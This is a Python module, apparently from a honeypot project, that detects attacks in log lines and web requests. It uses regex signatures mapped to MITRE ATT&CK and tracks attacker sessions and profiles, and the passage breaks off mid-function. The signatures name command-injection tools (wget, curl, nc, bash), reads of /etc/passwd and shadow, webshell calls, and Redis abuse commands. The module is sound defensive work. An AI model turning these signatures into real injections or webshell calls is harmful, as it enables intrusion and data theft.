"""
🎯 Attack Patterns Module - Enterprise Grade
Cyber Mirage - Role 4: Threat Intelligence Analyst

Production-ready attack pattern detection and analysis:
- MITRE ATT&CK Framework mapping
- Advanced pattern recognition
- Behavioral analysis
- Attack correlation
- Threat hunting capabilities

Author: Cyber Mirage Team
Version: 2.0.0 - Production
"""

import json
import logging
import re
import hashlib
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Tuple, Set
from dataclasses import dataclass, asdict, field
from enum import Enum
from collections import defaultdict, deque
from functools import lru_cache
import threading

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


# =============================================================================
# ENUMERATIONS
# =============================================================================

class AttackType(Enum):
    """Attack type classifications"""
    RECONNAISSANCE = "reconnaissance"
    BRUTE_FORCE = "brute_force"
    CREDENTIAL_STUFFING = "credential_stuffing"
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    PATH_TRAVERSAL = "path_traversal"
    COMMAND_INJECTION = "command_injection"
    VULNERABILITY_SCAN = "vulnerability_scan"
    MALWARE_DELIVERY = "malware_delivery"
    DATA_EXFILTRATION = "data_exfiltration"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    LATERAL_MOVEMENT = "lateral_movement"
    DENIAL_OF_SERVICE = "dos"
    CRYPTOMINING = "cryptomining"
    WEBSHELL = "webshell"
    RANSOMWARE = "ransomware"
    APT = "apt"
    UNKNOWN = "unknown"


class AttackStage(Enum):
    """Cyber Kill Chain stages"""
    RECONNAISSANCE = 1       # Information gathering
    WEAPONIZATION = 2        # Creating attack tools
    DELIVERY = 3             # Sending attack
    EXPLOITATION = 4         # Gaining access
    INSTALLATION = 5         # Installing malware
    COMMAND_CONTROL = 6      # Establishing C2
    ACTIONS_ON_OBJECTIVES = 7 # Achieving goals


class AttackSeverity(Enum):
    """Attack severity levels"""
    CRITICAL = "critical"     # Immediate response required
    HIGH = "high"             # Urgent attention needed
    MEDIUM = "medium"         # Standard investigation
    LOW = "low"               # Monitor and log
    INFO = "informational"    # For reference only


class AttackConfidence(Enum):
    """Confidence in attack detection"""
    CONFIRMED = 100
    HIGH = 85
    MEDIUM = 65
    LOW = 40
    UNKNOWN = 20


# =============================================================================
# DATA CLASSES
# =============================================================================

@dataclass
class AttackPattern:
    """Represents an identified attack pattern"""
    pattern_id: str
    attack_type: str
    attack_stage: int
    description: str
    severity: str
    confidence: int
    mitre_tactic: str
    mitre_technique: str
    mitre_id: str
    indicators: List[str]
    matched_content: str
    timestamp: str
    source_ip: str
    target_service: str
    recommendation: str
    
    def to_dict(self) -> Dict:
        return asdict(self)


@dataclass
class AttackerProfile:
    """Comprehensive attacker profile"""
    attacker_id: str
    ip_addresses: List[str]
    attack_types: List[str]
    first_seen: str
    last_seen: str
    total_attacks: int
    services_targeted: List[str]
    attack_stages_reached: List[int]
    sophistication_level: str
    threat_level: str
    associated_campaigns: List[str]
    tools_observed: List[str]
    ttps: List[str]
    iocs: Dict[str, List[str]]
    geographic_info: Dict
    attribution: Optional[str] = None
    
    def to_dict(self) -> Dict:
        return asdict(self)


@dataclass
class AttackSession:
    """Complete attack session analysis"""
    session_id: str
    source_ip: str
    start_time: str
    end_time: str
    duration_seconds: float
    patterns_detected: List[AttackPattern]
    total_events: int
    services_targeted: List[str]
    max_stage_reached: int
    overall_severity: str
    overall_confidence: int
    kill_chain_progress: Dict[str, bool]
    
    def to_dict(self) -> Dict:
        result = asdict(self)
        result['patterns_detected'] = [p.to_dict() for p in self.patterns_detected]
        return result


# =============================================================================
# MITRE ATT&CK DATABASE
# =============================================================================

class MitreAttackDB:
    """
    Production MITRE ATT&CK Framework Database
    Maps attacks to tactics, techniques, and mitigations
    """
    
    # Tactics (Why)
    TACTICS = {
        "TA0043": {"name": "Reconnaissance", "phase": 1, "description": "Gathering information"},
        "TA0042": {"name": "Resource Development", "phase": 2, "description": "Establishing resources"},
        "TA0001": {"name": "Initial Access", "phase": 3, "description": "Getting in"},
        "TA0002": {"name": "Execution", "phase": 4, "description": "Running malicious code"},
        "TA0003": {"name": "Persistence", "phase": 5, "description": "Maintaining presence"},
        "TA0004": {"name": "Privilege Escalation", "phase": 6, "description": "Gaining higher access"},
        "TA0005": {"name": "Defense Evasion", "phase": 7, "description": "Avoiding detection"},
        "TA0006": {"name": "Credential Access", "phase": 8, "description": "Stealing credentials"},
        "TA0007": {"name": "Discovery", "phase": 9, "description": "Exploring the environment"},
        "TA0008": {"name": "Lateral Movement", "phase": 10, "description": "Moving through environment"},
        "TA0009": {"name": "Collection", "phase": 11, "description": "Gathering target data"},
        "TA0011": {"name": "Command and Control", "phase": 12, "description": "Communicating with victims"},
        "TA0010": {"name": "Exfiltration", "phase": 13, "description": "Stealing data"},
        "TA0040": {"name": "Impact", "phase": 14, "description": "Disrupting operations"},
    }
    
    # Techniques (How)
    TECHNIQUES = {
        # Reconnaissance
        "T1595": {
            "name": "Active Scanning",
            "tactic": "TA0043",
            "description": "Scanning infrastructure to gather information",
            "subtechniques": {
                "T1595.001": "Scanning IP Blocks",
                "T1595.002": "Vulnerability Scanning",
                "T1595.003": "Wordlist Scanning"
            }
        },
        "T1592": {
            "name": "Gather Victim Host Information",
            "tactic": "TA0043",
            "description": "Gathering host-specific information"
        },
        
        # Initial Access
        "T1190": {
            "name": "Exploit Public-Facing Application",
            "tactic": "TA0001",
            "description": "Exploiting vulnerabilities in internet-facing systems",
            "severity": "critical"
        },
        "T1133": {
            "name": "External Remote Services",
            "tactic": "TA0001",
            "description": "Using remote services to gain access",
            "severity": "high"
        },
        "T1078": {
            "name": "Valid Accounts",
            "tactic": "TA0001",
            "description": "Using legitimate credentials",
            "subtechniques": {
                "T1078.001": "Default Accounts",
                "T1078.002": "Domain Accounts",
                "T1078.003": "Local Accounts",
                "T1078.004": "Cloud Accounts"
            }
        },
        
        # Execution
        "T1059": {
            "name": "Command and Scripting Interpreter",
            "tactic": "TA0002",
            "description": "Executing commands through interpreters",
            "subtechniques": {
                "T1059.001": "PowerShell",
                "T1059.002": "AppleScript",
                "T1059.003": "Windows Command Shell",
                "T1059.004": "Unix Shell",
                "T1059.005": "Visual Basic",
                "T1059.006": "Python",
                "T1059.007": "JavaScript"
            }
        },
        "T1203": {
            "name": "Exploitation for Client Execution",
            "tactic": "TA0002",
            "description": "Exploiting software vulnerabilities"
        },
        
        # Credential Access
        "T1110": {
            "name": "Brute Force",
            "tactic": "TA0006",
            "description": "Attempting to access accounts by guessing passwords",
            "subtechniques": {
                "T1110.001": "Password Guessing",
                "T1110.002": "Password Cracking",
                "T1110.003": "Password Spraying",
                "T1110.004": "Credential Stuffing"
            }
        },
        "T1003": {
            "name": "OS Credential Dumping",
            "tactic": "TA0006",
            "description": "Dumping credentials from the OS"
        },
        
        # Discovery
        "T1046": {
            "name": "Network Service Discovery",
            "tactic": "TA0007",
            "description": "Discovering network services"
        },
        "T1087": {
            "name": "Account Discovery",
            "tactic": "TA0007",
            "description": "Discovering user accounts"
        },
        
        # Lateral Movement
        "T1021": {
            "name": "Remote Services",
            "tactic": "TA0008",
            "description": "Using remote services for lateral movement",
            "subtechniques": {
                "T1021.001": "Remote Desktop Protocol",
                "T1021.002": "SMB/Windows Admin Shares",
                "T1021.004": "SSH",
                "T1021.006": "Windows Remote Management"
            }
        },
        
        # Command and Control
        "T1071": {
            "name": "Application Layer Protocol",
            "tactic": "TA0011",
            "description": "Using standard protocols for C2",
            "subtechniques": {
                "T1071.001": "Web Protocols",
                "T1071.002": "File Transfer Protocols",
                "T1071.003": "Mail Protocols",
                "T1071.004": "DNS"
            }
        },
        "T1573": {
            "name": "Encrypted Channel",
            "tactic": "TA0011",
            "description": "Using encryption to hide C2 traffic"
        },
        
        # Exfiltration
        "T1041": {
            "name": "Exfiltration Over C2 Channel",
            "tactic": "TA0010",
            "description": "Stealing data over C2 channel"
        },
        "T1048": {
            "name": "Exfiltration Over Alternative Protocol",
            "tactic": "TA0010",
            "description": "Using non-C2 protocols for exfiltration"
        },
        
        # Impact
        "T1486": {
            "name": "Data Encrypted for Impact",
            "tactic": "TA0040",
            "description": "Encrypting data to disrupt operations (ransomware)"
        },
        "T1499": {
            "name": "Endpoint Denial of Service",
            "tactic": "TA0040",
            "description": "Performing DoS against endpoints"
        },
    }
    
    @classmethod
    def get_technique(cls, technique_id: str) -> Optional[Dict]:
        """Get technique details by ID"""
        return cls.TECHNIQUES.get(technique_id)
    
    @classmethod
    def get_tactic(cls, tactic_id: str) -> Optional[Dict]:
        """Get tactic details by ID"""
        return cls.TACTICS.get(tactic_id)
    
    @classmethod
    def get_techniques_for_tactic(cls, tactic_id: str) -> List[Dict]:
        """Get all techniques for a tactic"""
        return [
            {"id": tid, **tech}
            for tid, tech in cls.TECHNIQUES.items()
            if tech.get("tactic") == tactic_id
        ]


# =============================================================================
# ATTACK PATTERN DATABASE
# =============================================================================

class AttackPatternDB:
    """
    Production attack pattern database
    Contains regex patterns and signatures for attack detection
    """
    
    # SSH Attack Patterns
    SSH_PATTERNS = {
        "brute_force": {
            "patterns": [
                r"Failed password for (?:invalid user )?(\w+) from ([\d\.]+)",
                r"Invalid user (\w+) from ([\d\.]+)",
                r"authentication failure.*rhost=([\d\.]+)",
                r"Connection closed by ([\d\.]+).*\[preauth\]",
            ],
            "mitre_id": "T1110.001",
            "mitre_tactic": "Credential Access",
            "mitre_technique": "Brute Force: Password Guessing",
            "severity": AttackSeverity.HIGH,
            "stage": AttackStage.EXPLOITATION,
            "threshold": 5,  # Number of failures to trigger
            "description": "SSH brute force attack attempting password guessing"
        },
        "password_spray": {
            "patterns": [
                r"Failed password for (\w+) from ([\d\.]+)",
            ],
            "mitre_id": "T1110.003",
            "mitre_tactic": "Credential Access",
            "mitre_technique": "Brute Force: Password Spraying",
            "severity": AttackSeverity.HIGH,
            "stage": AttackStage.EXPLOITATION,
            "threshold": 3,  # Same password, different users
            "description": "Password spraying attack detected"
        },
        "root_attempt": {
            "patterns": [
                r"Failed password for root from ([\d\.]+)",
                r"Invalid user root from ([\d\.]+)",
            ],
            "mitre_id": "T1078.003",
            "mitre_tactic": "Initial Access",
            "mitre_technique": "Valid Accounts: Local Accounts",
            "severity": AttackSeverity.CRITICAL,
            "stage": AttackStage.EXPLOITATION,
            "description": "Root login attempt detected"
        },
        "user_enumeration": {
            "patterns": [
                r"Invalid user (\w+) from ([\d\.]+)",
            ],
            "mitre_id": "T1087",
            "mitre_tactic": "Discovery",
            "mitre_technique": "Account Discovery",
            "severity": AttackSeverity.MEDIUM,
            "stage": AttackStage.RECONNAISSANCE,
            "threshold": 10,
            "description": "User enumeration attempt"
        }
    }
    
    # HTTP/Web Attack Patterns
    HTTP_PATTERNS = {
        "sql_injection": {
            "patterns": [
                r"(?:union\s+select|select\s+.*\s+from|insert\s+into|drop\s+table|delete\s+from)",
                r"(?:\'|\")\s*(?:or|and)\s+(?:\'|\"|\d)",
                r"(?:--|\#|\/\*|\*\/)",
                r"(?:;|%3B)\s*(?:drop|select|insert|update|delete)",
                r"(?:benchmark|sleep|waitfor|delay)\s*\(",
                r"information_schema",
                r"load_file\s*\(",
                r"into\s+(?:outfile|dumpfile)",
            ],
            "mitre_id": "T1190",
            "mitre_tactic": "Initial Access",
            "mitre_technique": "Exploit Public-Facing Application",
            "severity": AttackSeverity.CRITICAL,
            "stage": AttackStage.EXPLOITATION,
            "description": "SQL injection attack attempt"
        },
        "xss": {
            "patterns": [
                r"<script[^>]*>.*?</script>",
                r"javascript:",
                r"on(?:error|load|click|mouseover|focus|blur)\s*=",
                r"<img[^>]+onerror\s*=",
                r"<svg[^>]+onload\s*=",
                r"document\.(?:cookie|location|write)",
                r"eval\s*\(",
                r"alert\s*\(",
            ],
            "mitre_id": "T1059.007",
            "mitre_tactic": "Execution",
            "mitre_technique": "Command and Scripting Interpreter: JavaScript",
            "severity": AttackSeverity.HIGH,
            "stage": AttackStage.EXPLOITATION,
            "description": "Cross-site scripting (XSS) attack attempt"
        },
        "path_traversal": {
            "patterns": [
                r"(?:\.\./|\.\.\\)+",
                r"(?:%2e%2e[%2f%5c])+",
                r"/etc/(?:passwd|shadow|hosts)",
                r"(?:c:|d:)[\\\/]windows",
                r"\/var\/log\/",
                r"\/proc\/self\/",
            ],
            "mitre_id": "T1083",
            "mitre_tactic": "Discovery",
            "mitre_technique": "File and Directory Discovery",
            "severity": AttackSeverity.HIGH,
            "stage": AttackStage.EXPLOITATION,
            "description": "Path traversal attack attempt"
        },
        "command_injection": {
            "patterns": [
                r";\s*(?:ls|cat|id|whoami|wget|curl|nc|bash|sh|python|perl|php)",
                r"\|\s*(?:ls|cat|id|whoami|wget|curl|nc|bash|sh)",
                r"\$\(.*\)",
                r"`[^`]+`",
                r"&&\s*(?:ls|cat|id|whoami|wget|curl)",
                r"\|\|\s*(?:ls|cat|id|whoami|wget|curl)",
            ],
            "mitre_id": "T1059.004",
            "mitre_tactic": "Execution",
            "mitre_technique": "Command and Scripting Interpreter: Unix Shell",
            "severity": AttackSeverity.CRITICAL,
            "stage": AttackStage.EXPLOITATION,
            "description": "Command injection attack attempt"
        },
        "webshell": {
            "patterns": [
                r"(?:c99|r57|wso|b374k|alfa)\.php",
                r"(?:eval|assert|system|passthru|shell_exec|exec)\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)",
                r"FilesMan",
                r"WSO\s+\d",
                r"phpinfo\s*\(\s*\)",
            ],
            "mitre_id": "T1505.003",
            "mitre_tactic": "Persistence",
            "mitre_technique": "Server Software Component: Web Shell",
            "severity": AttackSeverity.CRITICAL,
            "stage": AttackStage.INSTALLATION,
            "description": "Web shell upload/access attempt"
        },
        "vulnerability_scan": {
            "patterns": [
                r"(?:nmap|nikto|sqlmap|w3af|acunetix|burpsuite)",
                r"Wget\/\d",
                r"python-requests",
                r"curl\/\d",
                r"masscan",
                r"zgrab",
                r"Go-http-client",
            ],
            "mitre_id": "T1595.002",
            "mitre_tactic": "Reconnaissance",
            "mitre_technique": "Active Scanning: Vulnerability Scanning",
            "severity": AttackSeverity.MEDIUM,
            "stage": AttackStage.RECONNAISSANCE,
            "description": "Automated vulnerability scanning detected"
        },
        "admin_access": {
            "patterns": [
                r"\/(?:admin|wp-admin|administrator|phpmyadmin|cpanel)",
                r"\/(?:manager|console|dashboard|backend)(?:\/|$)",
                r"\/(?:wp-login|xmlrpc)\.php",
            ],
            "mitre_id": "T1078.001",
            "mitre_tactic": "Initial Access",
            "mitre_technique": "Valid Accounts: Default Accounts",
            "severity": AttackSeverity.MEDIUM,
            "stage": AttackStage.RECONNAISSANCE,
            "description": "Administrative interface access attempt"
        }
    }
    
    # Database Attack Patterns (MySQL, PostgreSQL, Redis, MongoDB)
    DATABASE_PATTERNS = {
        "mysql_injection": {
            "patterns": [
                r"UNION\s+ALL\s+SELECT",
                r"INTO\s+OUTFILE",
                r"LOAD_FILE\s*\(",
                r"information_schema\.tables",
            ],
            "mitre_id": "T1190",
            "mitre_tactic": "Initial Access",
            "mitre_technique": "Exploit Public-Facing Application",
            "severity": AttackSeverity.CRITICAL,
            "stage": AttackStage.EXPLOITATION,
            "description": "MySQL injection attack"
        },
        "redis_unauthorized": {
            "patterns": [
                r"CONFIG\s+SET",
                r"SLAVEOF\s+",
                r"DEBUG\s+SEGFAULT",
                r"SCRIPT\s+FLUSH",
                r"FLUSHALL",
                r"MODULE\s+LOAD",
            ],
            "mitre_id": "T1190",
            "mitre_tactic": "Initial Access",
            "mitre_technique": "Exploit Public-Facing Application",
            "severity": AttackSeverity.CRITICAL,
            "stage": AttackStage.EXPLOITATION,
            "description": "Redis unauthorized command execution"
        },
        "mongodb_injection": {
            "patterns": [
                r"\$where\s*:",
                r"\$regex\s*:",
                r"\.find\s*\(\s*\{.*\$",
                r"mapReduce",
            ],
            "mitre_id": "T1190",
            "mitre_tactic": "Initial Access",
            "mitre_technique": "Exploit Public-Facing Application",
            "severity": AttackSeverity.HIGH,
            "stage": AttackStage.EXPLOITATION,
            "description": "MongoDB NoSQL injection"
        }
    }
    
    # ICS/SCADA Attack Patterns
    ICS_PATTERNS = {
        "modbus_scan": {
            "patterns": [
                r"Read Coils",
                r"Read Holding Registers",
                r"Write Multiple Registers",
                r"Function Code: \d+",
            ],
            "mitre_id": "T1046",
            "mitre_tactic": "Discovery",
            "mitre_technique": "Network Service Discovery",
            "severity": AttackSeverity.HIGH,
            "stage": AttackStage.RECONNAISSANCE,
            "description": "Modbus/ICS reconnaissance"
        },
        "modbus_manipulation": {
            "patterns": [
                r"Write Single Coil",
                r"Write Single Register",
                r"Force Multiple Coils",
                r"Preset Multiple Registers",
            ],
            "mitre_id": "T1565",
            "mitre_tactic": "Impact",
            "mitre_technique": "Data Manipulation",
            "severity": AttackSeverity.CRITICAL,
            "stage": AttackStage.ACTIONS_ON_OBJECTIVES,
            "description": "Modbus/ICS manipulation attempt"
        }
    }
    
    # Malware Indicators
    MALWARE_PATTERNS = {
        "cryptominer": {
            "patterns": [
                r"stratum\+tcp://",
                r"xmrig",
                r"nicehash",
                r"minergate",
                r"coinhive",
                r"(?:monerominerd|xmr-stak)",
            ],
            "mitre_id": "T1496",
            "mitre_tactic": "Impact",
            "mitre_technique": "Resource Hijacking",
            "severity": AttackSeverity.HIGH,
            "stage": AttackStage.ACTIONS_ON_OBJECTIVES,
            "description": "Cryptocurrency mining activity"
        },
        "ransomware": {
            "patterns": [
                r"\.(?:encrypted|locked|crypto)$",
                r"YOUR_FILES_ARE_ENCRYPTED",
                r"PAY\s+BITCOIN",
                r"DECRYPT_INSTRUCTION",
            ],
            "mitre_id": "T1486",
            "mitre_tactic": "Impact",
            "mitre_technique": "Data Encrypted for Impact",
            "severity": AttackSeverity.CRITICAL,
            "stage": AttackStage.ACTIONS_ON_OBJECTIVES,
            "description": "Ransomware indicators"
        },
        "c2_beacon": {
            "patterns": [
                r"beacon",
                r"heartbeat",
                r"checkin",
                r"callback",
            ],
            "mitre_id": "T1071.001",
            "mitre_tactic": "Command and Control",
            "mitre_technique": "Application Layer Protocol: Web Protocols",
            "severity": AttackSeverity.CRITICAL,
            "stage": AttackStage.COMMAND_CONTROL,
            "description": "C2 beacon communication"
        }
    }


# =============================================================================
# ATTACK PATTERN ANALYZER
# =============================================================================

class AttackPatternAnalyzer:
    """
    Production-grade attack pattern analyzer
    Detects and classifies attacks using pattern matching and behavioral analysis
    """
    
    def __init__(self, redis_client=None, db_connection=None):
        """
        Initialize analyzer
        
        Args:
            redis_client: Redis client for caching and history
            db_connection: PostgreSQL connection
        """
        self.redis = redis_client
        self.db = db_connection
        
        # Pattern database
        self.pattern_db = AttackPatternDB()
        self.mitre_db = MitreAttackDB()
        
        # Compile all regex patterns
        self._compiled_patterns: Dict[str, Dict] = {}
        self._compile_patterns()
        
        # Attack tracking
        self.attack_sessions: Dict[str, AttackSession] = {}
        self.attacker_profiles: Dict[str, AttackerProfile] = {}
        self.ip_failure_counts: Dict[str, Dict] = defaultdict(lambda: defaultdict(int))
        
        # Time windows for correlation
        self.session_timeout = 1800  # 30 minutes
        self.correlation_window = 300  # 5 minutes
        
        # Statistics
        self.statistics = defaultdict(int)
        
        logger.info("AttackPatternAnalyzer initialized with production patterns")
    
    def _compile_patterns(self):
        """Compile all regex patterns for performance"""
        pattern_categories = [
            ("ssh", self.pattern_db.SSH_PATTERNS),
            ("http", self.pattern_db.HTTP_PATTERNS),
            ("database", self.pattern_db.DATABASE_PATTERNS),
            ("ics", self.pattern_db.ICS_PATTERNS),
            ("malware", self.pattern_db.MALWARE_PATTERNS),
        ]
        
        for category, patterns in pattern_categories:
            for name, config in patterns.items():
                key = f"{category}:{name}"
                self._compiled_patterns[key] = {
                    "compiled": [re.compile(p, re.IGNORECASE) for p in config["patterns"]],
                    "config": config
                }
        
        logger.info(f"Compiled {len(self._compiled_patterns)} pattern sets")
    
    # =========================================================================
    # PATTERN ANALYSIS
    # =========================================================================
    
    def analyze(self, content: str, source_ip: str, service: str = "unknown",
                context: Dict = None) -> List[AttackPattern]:
        """
        Analyze content for attack patterns
        
        Args:
            content: Content to analyze (log line, request, etc.)
            source_ip: Source IP address
            service: Target service name
            context: Additional context
        
        Returns:
            List of detected attack patterns
        """
        detected_patterns = []
        context = context or {}
        
        self.statistics["analysis_count"] += 1
        
        # Select relevant pattern sets based on service
        pattern_sets = self._get_relevant_patterns(service)
        
        # Check all relevant patterns
        for pattern_key, pattern_data in pattern_sets.items():
            for compiled_pattern in pattern_data["compiled"]:
                match = compiled_pattern.search(content)
                
                if match:
                    config = pattern_data["config"]
                    
                    pattern = self._create_pattern(
                        pattern_key=pattern_key,
                        config=config,
                        match=match,
                        content=content,
                        source_ip=source_ip,
                        service=service
                    )
                    
                    detected_patterns.append(pattern)
                    self.statistics["patterns_detected"] += 1
                    
                    # Track failure counts for threshold-based detection
                    self._track_failures(source_ip, pattern_key, config)
        
        # Additional behavioral analysis
        behavioral_patterns = self._behavioral_analysis(
            source_ip, service, detected_patterns, context
        )
        detected_patterns.extend(behavioral_patterns)
        
        # Update attack session
        if detected_patterns:
            self._update_session(source_ip, service, detected_patterns)
        
        return detected_patterns
    
    def _get_relevant_patterns(self, service: str) -> Dict:
        """Get pattern sets relevant to the service"""
        service_lower = service.lower()
        
        # Map services to pattern categories
        relevant = {}
        
        if service_lower in ["ssh", "openssh"]:
            relevant.update({k: v for k, v in self._compiled_patterns.items() if k.startswith("ssh:")})
        elif service_lower in ["http", "https", "nginx", "apache", "web"]:
            relevant.update({k: v for k, v in self._compiled_patterns.items() if k.startswith("http:")})
        elif service_lower in ["mysql", "mariadb"]:
            relevant.update({k: v for k, v in self._compiled_patterns.items() 
                           if k.startswith("database:") or "mysql" in k})
        elif service_lower in ["redis"]:
            relevant.update({k: v for k, v in self._compiled_patterns.items() 
                           if "redis" in k})
        elif service_lower in ["mongodb", "mongo"]:
            relevant.update({k: v for k, v in self._compiled_patterns.items() 
                           if "mongo" in k})
        elif service_lower in ["modbus", "scada", "ics"]:
            relevant.update({k: v for k, v in self._compiled_patterns.items() if k.startswith("ics:")})
        else:
            # Return all patterns for unknown services
            relevant = self._compiled_patterns.copy()
        
        # Always check malware patterns
        relevant.update({k: v for k, v in self._compiled_patterns.items() if k.startswith("malware:")})
        
        return relevant
    
    def _create_pattern(self, pattern_key: str, config: Dict, match: re.Match,
                       content: str, source_ip: str, service: str) -> AttackPattern:
        """Create AttackPattern from match"""
        pattern_id = f"AP-{hashlib.md5(f'{pattern_key}{source_ip}{datetime.now()}'.encode()).hexdigest()[:10]}"
        
        # Get severity value
        severity = config.get("severity", AttackSeverity.MEDIUM)
        if isinstance(severity, AttackSeverity):
            severity_str = severity.value
        else:
            severity_str = str(severity)
        
        # Get attack stage
        stage = config.get("stage", AttackStage.EXPLOITATION)
        if isinstance(stage, AttackStage):
            stage_value = stage.value
        else:
            stage_value = int(stage)
        
        # Get matched content (truncate if too long)
        matched = match.group(0)[:200] if match.group(0) else ""
        
        # Get indicators from match groups
        indicators = list(match.groups()) if match.groups() else [matched]
        
        # Generate recommendation
        recommendation = self._generate_recommendation(pattern_key, config, source_ip)
        
        return AttackPattern(
            pattern_id=pattern_id,
            attack_type=pattern_key.split(":")[-1],
            attack_stage=stage_value,
            description=config.get("description", "Unknown attack pattern"),
            severity=severity_str,
            confidence=AttackConfidence.HIGH.value,
            mitre_tactic=config.get("mitre_tactic", "Unknown"),
            mitre_technique=config.get("mitre_technique", "Unknown"),
            mitre_id=config.get("mitre_id", "Unknown"),
            indicators=indicators,
            matched_content=matched,
            timestamp=datetime.now().isoformat(),
            source_ip=source_ip,
            target_service=service,
            recommendation=recommendation
        )
    
    def _track_failures(self, source_ip: str, pattern_key: str, config: Dict):
        """Track failure counts for threshold-based detection"""
        self.ip_failure_counts[source_ip][pattern_key] += 1
        
        # Check threshold
        threshold = config.get("threshold", 0)
        if threshold > 0:
            count = self.ip_failure_counts[source_ip][pattern_key]
            if count == threshold:
                logger.warning(f"Threshold reached for {source_ip}: {pattern_key} ({count} attempts)")
    
    def _behavioral_analysis(self, source_ip: str, service: str,
                            patterns: List[AttackPattern], context: Dict) -> List[AttackPattern]:
        """Perform behavioral analysis for additional patterns"""
        additional_patterns = []
        
        # Check for rapid request patterns (DoS)
        if context.get("request_rate", 0) > 100:
            additional_patterns.append(self._create_dos_pattern(source_ip, service, context))
        
        # Check for attack progression (APT indicators)
        if len(patterns) > 3:
            stages = set(p.attack_stage for p in patterns)
            if len(stages) >= 3:
                additional_patterns.append(self._create_apt_pattern(source_ip, service, patterns))
        
        return additional_patterns
    
    def _create_dos_pattern(self, source_ip: str, service: str, context: Dict) -> AttackPattern:
        """Create DoS attack pattern"""
        pattern_id = f"AP-DOS-{hashlib.md5(f'{source_ip}{datetime.now()}'.encode()).hexdigest()[:10]}"
        
        return AttackPattern(
            pattern_id=pattern_id,
            attack_type="dos",
            attack_stage=AttackStage.ACTIONS_ON_OBJECTIVES.value,
            description="Denial of Service attack detected",
            severity="critical",
            confidence=AttackConfidence.HIGH.value,
            mitre_tactic="Impact",
            mitre_technique="Endpoint Denial of Service",
            mitre_id="T1499",
            indicators=[f"Request rate: {context.get('request_rate', 'unknown')}/sec"],
            matched_content="High volume request pattern",
            timestamp=datetime.now().isoformat(),
            source_ip=source_ip,
            target_service=service,
            recommendation="Implement rate limiting and consider blocking this IP"
        )
    
    def _create_apt_pattern(self, source_ip: str, service: str,
                           patterns: List[AttackPattern]) -> AttackPattern:
        """Create APT indicator pattern"""
        pattern_id = f"AP-APT-{hashlib.md5(f'{source_ip}{datetime.now()}'.encode()).hexdigest()[:10]}"
        
        stages = [p.attack_stage for p in patterns]
        
        return AttackPattern(
            pattern_id=pattern_id,
            attack_type="apt",
            attack_stage=max(stages),
            description="Advanced Persistent Threat indicators detected",
            severity="critical",
            confidence=AttackConfidence.MEDIUM.value,
            mitre_tactic="Multiple Tactics",
            mitre_technique="Multi-stage Attack",
            mitre_id="N/A",
            indicators=[f"Stages observed: {sorted(set(stages))}"],
            matched_content=f"Multiple attack patterns: {len(patterns)}",
            timestamp=datetime.now().isoformat(),
            source_ip=source_ip,
            target_service=service,
            recommendation="CRITICAL: Initiate incident response. This appears to be a sophisticated multi-stage attack."
        )
    
    def _generate_recommendation(self, pattern_key: str, config: Dict, source_ip: str) -> str:
        """Generate recommendation based on pattern"""
        severity = config.get("severity", AttackSeverity.MEDIUM)
        if isinstance(severity, AttackSeverity):
            severity_str = severity.value
        else:
            severity_str = str(severity)
        
        recommendations = {
            "critical": f"🚨 CRITICAL: Immediately block {source_ip} and initiate incident response",
            "high": f"⚠️ HIGH: Block {source_ip} and investigate recent activity",
            "medium": f"🟡 MEDIUM: Monitor {source_ip} and consider temporary blocking",
            "low": f"🟢 LOW: Log activity from {source_ip} for future reference"
        }
        
        return recommendations.get(severity_str, f"Monitor traffic from {source_ip}")
    
    # =========================================================================
    # SESSION MANAGEMENT
    # =========================================================================
    
    def _update_session(self, source_ip: str, service: str, patterns: List[AttackPattern]):
        """Update attack session for IP"""
        session_key = f"{source_ip}:{service}"
        now = datetime.now()
        
        if session_key not in self.attack_sessions:
            # Create new session
            self.attack_sessions[session_key] = AttackSession(
                session_id=f"AS-{hashlib.md5(session_key.encode()).hexdigest()[:10]}",
                source_ip=source_ip,
                start_time=now.isoformat(),
                end_time=now.isoformat(),
                duration_seconds=0,
                patterns_detected=patterns,
                total_events=len(patterns),
                services_targeted=[service],
                max_stage_reached=max(p.attack_stage for p in patterns),
                overall_severity=max(p.severity for p in patterns),
                overall_confidence=int(sum(p.confidence for p in patterns) / len(patterns)),
                kill_chain_progress={
                    "reconnaissance": any(p.attack_stage == 1 for p in patterns),
                    "weaponization": any(p.attack_stage == 2 for p in patterns),
                    "delivery": any(p.attack_stage == 3 for p in patterns),
                    "exploitation": any(p.attack_stage == 4 for p in patterns),
                    "installation": any(p.attack_stage == 5 for p in patterns),
                    "command_control": any(p.attack_stage == 6 for p in patterns),
                    "actions_on_objectives": any(p.attack_stage == 7 for p in patterns),
                }
            )
        else:
            # Update existing session
            session = self.attack_sessions[session_key]
            session.end_time = now.isoformat()
            
            start = datetime.fromisoformat(session.start_time)
            session.duration_seconds = (now - start).total_seconds()
            
            session.patterns_detected.extend(patterns)
            session.total_events += len(patterns)
            
            max_stage = max(max(p.attack_stage for p in patterns), session.max_stage_reached)
            session.max_stage_reached = max_stage
            
            # Update kill chain
            for p in patterns:
                stage_name = {
                    1: "reconnaissance", 2: "weaponization", 3: "delivery",
                    4: "exploitation", 5: "installation", 6: "command_control",
                    7: "actions_on_objectives"
                }.get(p.attack_stage)
                if stage_name:
                    session.kill_chain_progress[stage_name] = True
        
        # Update attacker profile
        self._update_attacker_profile(source_ip, service, patterns)
    
    def _update_attacker_profile(self, source_ip: str, service: str,
                                 patterns: List[AttackPattern]):
        """Update attacker profile"""
        now = datetime.now()
        
        if source_ip not in self.attacker_profiles:
            # Create new profile
            self.attacker_profiles[source_ip] = AttackerProfile(
                attacker_id=f"ATK-{hashlib.md5(source_ip.encode()).hexdigest()[:10]}",
                ip_addresses=[source_ip],
                attack_types=[p.attack_type for p in patterns],
                first_seen=now.isoformat(),
                last_seen=now.isoformat(),
                total_attacks=len(patterns),
                services_targeted=[service],
                attack_stages_reached=[p.attack_stage for p in patterns],
                sophistication_level="unknown",
                threat_level="medium",
                associated_campaigns=[],
                tools_observed=[],
                ttps=[f"{p.mitre_id}: {p.mitre_technique}" for p in patterns],
                iocs={"ips": [source_ip], "patterns": [p.matched_content for p in patterns]},
                geographic_info={}
            )
        else:
            # Update existing profile
            profile = self.attacker_profiles[source_ip]
            profile.last_seen = now.isoformat()
            profile.total_attacks += len(patterns)
            
            for p in patterns:
                if p.attack_type not in profile.attack_types:
